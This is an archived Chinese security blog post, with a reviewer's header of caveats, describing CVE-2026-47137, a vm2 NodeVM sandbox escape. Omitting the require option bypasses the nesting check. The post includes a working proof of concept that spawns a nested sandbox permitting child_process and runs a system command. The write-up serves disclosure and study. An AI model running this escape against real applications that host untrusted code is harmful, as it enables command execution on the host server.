---
cve: "CVE-2026-47137"
source: "gelusus/wxvl 公众号漏洞文库"
product: "vm2 / NodeVM nesting选项"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2026-47137"
referenced_identifiers: "CVE-2026-47209; CVE-2026-47135; CVE-2023-37903"
identifier_role: "primary"
identifier_status: "unknown"
title: "vm2沙箱逃逸满分漏洞？AI有点东西"
prerequisites: "来源所述条件，未列明部分仍待核：未给影响/修复版本或commit；要求nesting=true并省略require选项"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-d4d7d58fb33007fe1fa79fe1"
entity_id: "ve-d4d7d58fb33007fe1fa79fe1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：未给影响/修复版本或commit；要求nesting=true并省略require选项

代码与实验材料：有两段校验与NodeVM子沙箱代码，缺imports/完整环境，未执行

来源证据范围：作者秋风，未给官方GHSA/patch，编号归属需核验

- **事实待核（1）**：三个新编号未说明各自根因；依据：正文只分析一个满分绕过，47137/47209/47135并列但无对应表，不能把全部映射该payload。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：缺版本、补丁与宿主配置边界；依据：nesting为显式选项，不是全部默认vm2；完整攻击需要应用允许不可信代码。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：TOCTOU类比应更精确；依据：这里是默认值归一化与检查不一致，没有时间竞态，应避免按竞态CWE归类。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  vm2沙箱逃逸满分漏洞？AI有点东西  
原创 秋风
                    秋风  秋风的安全之路   2026-05-19 08:47  
  
依旧标题党（（（  
  
今天正好下cve了随缘分享一下  
  
1 Critical10/ 10   
  
2 high  
  
CVE-2026-47137  
  
CVE-2026-47209   
  
CVE-2026-47135  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ogrJiczzwv0DqycTn8oOAzfD7iapGrzeN0gRxXsxzIE0ricyiavyia5lDibhMaHgicmfiaUoZTZyzoEhq6s8WARWue1HOzn9ibnLmz07Q7GicbbbAq35o/640?wx_fmt=png&from=appmsg "")  
  
  
满分十分的这个是个绕过  
  
之前的 CVE-2023-37903 修复时,作者意识到一个危险组合:  
> 如果允许 nesting: true  
(可以创建子沙箱)但 require: false  
(自己用不了 require),那么沙箱内的代码可以通过 require('vm2')  
 拿到 vm2 库本身,然后构造一个**配置更宽松的子沙箱**  
,从而完全逃逸。  
  
  
  
所以补丁在 nodevm.js  
 第 263 行加了一道关卡:  
```
if (options.nesting === true && options.require === false) {
    throw new VMError('...');
}
```  
#### 绕过点:=== false 太严格了  
  
问题出在 options.require === false  
 这个**严格相等**  
判断。它只在用户**显式传入**require: false  
 时才成立。  
  
但在 JavaScript 中,如果用户**根本不传 require 这个选项**  
,options.require  
 的值是 undefined  
,而 undefined === false  
 是 false  
,检查直接跳过。  
  
然后第 280 行有这么一句:  
```
const { require: requireOpts = false } = options;
```  
  
这是解构赋值的默认值语法 —— 当 options.require  
 是 undefined  
 时,requireOpts  
 被赋值为 false  
。  
  
**结果就是**  
:运行时的实际行为完全等同于 require: false  
,但安全检查却被绕过了。这是典型的"**检查时的值**  
"和"**使用时的值**  
"不一致(TOCTOU 思维变体)。  
###   
```
const nvm = new NodeVM({ nesting: true });  // 不传 require,绕过检查

nvm.run(`
  // 第 1 步:在沙箱里拿到 vm2 库本身(因为 nesting:true)
  const { NodeVM } = require('vm2');

  // 第 2 步:创建一个允许 child_process 的内层沙箱
  const inner = new NodeVM({
    require: { builtin: ['child_process'] }
  });

  // 第 3 步:在内层沙箱里直接执行系统命令
  module.exports = inner.run(
    "module.exports = require('child_process').execSync('id').toString()"
  );
`);
```  
  
**内层 NodeVM 的配置完全独立于外层,vm2 没有"继承父沙箱限制"的机制。一旦你能控制内层沙箱的配置,你就能给它任意权限**  
  
****  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
